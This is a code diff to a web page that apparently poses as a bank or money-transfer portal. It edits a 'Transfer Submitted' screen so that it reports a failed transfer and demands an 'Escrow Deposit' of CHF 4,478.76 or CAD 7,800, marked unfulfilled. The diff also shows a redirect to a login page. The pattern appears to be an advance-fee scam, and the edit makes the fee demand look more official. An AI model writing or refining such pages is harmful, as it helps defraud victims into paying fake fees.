@@ -414,9 +414,17 @@ title.textContent="Transfer Submitted";
 
 body.innerHTML=`
 
-<p><strong>Transfer failed!</strong></p>
+<p><strong>Transfer Status:</strong> Failed</p>
 
-<p>Please provide the <strong>ESCROW DEPOSIT</strong>.</p>
+<p>The transfer cannot be completed due to an <strong>unfulfilled Escrow Deposit requirement</strong>.</p>
+
+<p><strong>Escrow Deposit Required:</strong></p>
+
+<p>CHF 4,478.76<br>
+or<br>
+CAD 7,800</p>
+
+<p>Status: <strong>Unfulfilled</strong></p>
 
 `;
 
@@ -434,3 +442,4 @@ window.location.href="login.html";
 </body>
 
 </html>
+
